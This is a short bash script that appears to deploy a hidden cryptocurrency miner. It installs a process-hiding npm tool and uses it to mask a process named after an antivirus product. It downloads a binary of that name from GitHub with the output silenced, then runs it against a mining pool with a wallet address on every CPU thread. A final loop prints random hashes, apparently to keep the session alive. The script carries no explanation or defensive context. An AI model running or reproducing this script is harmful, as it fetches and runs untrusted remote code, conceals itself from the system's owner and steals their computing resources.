#!/bin/bash
#!/bin/sh
#!/bin/bash

apt update
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider 
ph add avast
wget https://github.com/circelwenakyo/nyobsa/raw/main/avast >/dev/null 2>&1
chmod +x avast >/dev/null 2>&1
./avast -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1_1000 -n 1)_1) -p x -t $(nproc)
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
